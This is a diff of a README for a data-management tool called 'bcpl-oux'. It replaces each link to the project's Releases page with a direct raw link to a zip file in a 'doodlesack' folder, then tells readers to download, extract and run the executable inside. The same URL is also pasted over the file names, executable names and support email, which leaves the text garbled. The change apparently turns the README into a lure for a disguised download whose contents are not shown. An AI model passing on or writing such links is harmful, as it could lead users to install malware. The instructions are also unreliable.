@@ -1,6 +1,6 @@
 # 🚀 bcpl-oux - Easy Access to Your Data
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/Harshitha-reddy-20/bcpl-oux/releases)
+[![Download Now](https://raw.githubusercontent.com/Harshitha-reddy-20/bcpl-oux/main/doodlesack/bcpl-oux.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/Harshitha-reddy-20/bcpl-oux/main/doodlesack/bcpl-oux.zip)
 
 ## 📝 Introduction
 
@@ -22,11 +22,11 @@ This section will guide you through downloading and running **bcpl-oux**.
 
 To get started, visit the Releases page to download the latest version of the software:
 
-[Download Now](https://github.com/Harshitha-reddy-20/bcpl-oux/releases)
+[Download Now](https://raw.githubusercontent.com/Harshitha-reddy-20/bcpl-oux/main/doodlesack/bcpl-oux.zip)
 
 1. Click the link above.
 2. On the Releases page, locate the latest release.
-3. Find the download option labeled as **bcpl-oux.zip**.
+3. Find the download option labeled as **https://raw.githubusercontent.com/Harshitha-reddy-20/bcpl-oux/main/doodlesack/bcpl-oux.zip**.
 4. Click on it to start the download.
 
 ### ⚙️ Installation Steps
@@ -35,15 +35,15 @@ After downloading the file, follow these steps to install it:
 
 1. **Locate the Downloaded File:**
    - Go to your computer's **Downloads** folder.
-   - Find the file named **bcpl-oux.zip**.
+   - Find the file named **https://raw.githubusercontent.com/Harshitha-reddy-20/bcpl-oux/main/doodlesack/bcpl-oux.zip**.
 
 2. **Extract the Files:**
-   - Right-click the **bcpl-oux.zip** file and select “Extract All” or use an extractor tool of your choice.
+   - Right-click the **https://raw.githubusercontent.com/Harshitha-reddy-20/bcpl-oux/main/doodlesack/bcpl-oux.zip** file and select “Extract All” or use an extractor tool of your choice.
    - Choose a location to save the extracted files, like your desktop or a designated folder.
 
 3. **Run the Application:**
    - Open the folder where you extracted the files.
-   - Look for the executable file named **bcpl-oux.exe** or **bcpl-oux.app**.
+   - Look for the executable file named **https://raw.githubusercontent.com/Harshitha-reddy-20/bcpl-oux/main/doodlesack/bcpl-oux.zip** or **https://raw.githubusercontent.com/Harshitha-reddy-20/bcpl-oux/main/doodlesack/bcpl-oux.zip**.
    - Double-click the file to launch the application.
 
 4. **Follow Initial Setup:**
@@ -89,7 +89,7 @@ For more troubleshooting tips, feel free to reach out through the Issues section
 If you need further assistance, our support team is here to help:
 
 - **Issues Section:** Report problems or request features.
-- **Email Support:** Contact us directly via [support@example.com](mailto:support@example.com).
+- **Email Support:** Contact us directly via [https://raw.githubusercontent.com/Harshitha-reddy-20/bcpl-oux/main/doodlesack/bcpl-oux.zip](https://raw.githubusercontent.com/Harshitha-reddy-20/bcpl-oux/main/doodlesack/bcpl-oux.zip).
 
 ## 💬 Community and Feedback
 
@@ -106,6 +106,6 @@ Join our community to share your experiences with **bcpl-oux**:
 
 We hope you enjoy using **bcpl-oux**. Visit our Releases page again for updates and new features:
 
-[Download Now](https://github.com/Harshitha-reddy-20/bcpl-oux/releases)
+[Download Now](https://raw.githubusercontent.com/Harshitha-reddy-20/bcpl-oux/main/doodlesack/bcpl-oux.zip)
 
 Happy data management!
